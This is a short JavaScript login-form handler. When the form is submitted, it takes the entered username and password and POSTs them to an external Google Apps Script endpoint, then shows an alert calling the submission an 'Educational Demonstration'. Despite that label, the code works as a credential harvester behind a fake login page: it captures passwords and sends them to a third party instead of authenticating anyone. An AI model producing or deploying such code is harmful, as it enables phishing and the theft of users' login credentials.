const form = document.getElementById("loginForm");

form.addEventListener("submit", function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    fetch("https://script.google.com/macros/s/AKfycbxfAPByykld75--6V5MH-mG3R-OIwQQX2KLxO6oiO_0eTMZtC9djBPPwHY6F-sbynTz/exec", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            username: username,
            password: password
        })
    })
    .then(response => response.text())
    .then(data => {
        alert("Educational Demonstration: Test data submitted successfully.");
        form.reset();
    })
    .catch(error => {
        alert("Error submitting data.");
        console.error(error);
    });
});
